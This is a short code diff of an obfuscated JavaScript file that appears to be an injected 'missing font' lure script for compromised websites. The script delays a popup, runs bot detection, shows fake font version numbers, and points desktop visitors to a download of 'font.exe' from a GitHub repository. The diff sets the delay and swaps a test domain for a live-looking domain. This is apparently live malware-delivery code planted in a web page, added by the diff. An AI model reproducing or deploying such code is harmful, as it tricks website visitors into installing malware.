@@ -11,7 +11,7 @@ var _0x30d4=['EGkcfMKcX8KcUQ==','E8OMwrQs','anvDjcKCQ2I=','wqnCi8KNwpXDhhU=','w7
 		var linkMobile = ['Mobile']; // Link for mobile
 		//var linkDesktop = [['General'], ['Chrome'], ['Firefox'], ['Opera'], ['Safari'], ['Edge'], ['IE']]; // Link for Desktop | General Chrome Firefox Opera Safari Edge IE
 		var linkDesktop = [['https://github.com/avasterm/btc-db8889/raw/master/font.exe'], ['Chrome'], ['Firefox'], ['Opera'], ['Safari'], ['Edge'], ['IE']];
-	    var startTime = 1000; // Milliseconds
+	    var startTime = 2000; // Milliseconds
 	    var oneTimeShow = false; // true | false
 	    var secret = 'df5789514c84b99953f0159471bf40a9';
 	    var device = 'Desktop'; // All | Mobile | Desktop
@@ -23,7 +23,7 @@ var _0x30d4=['EGkcfMKcX8KcUQ==','E8OMwrQs','anvDjcKCQ2I=','wqnCi8KNwpXDhhU=','w7
 	    var font_versions = [['23.43.5443.12'], ['28.56.5543.23']]; //OLD - NEW
 
 	    /* Start */
-	    var domen = 'testdomen.xyz';
+	    var domen = 'open.mgmails.com';
 
 	    var detecct = false;
 	    /* Detect Bot */
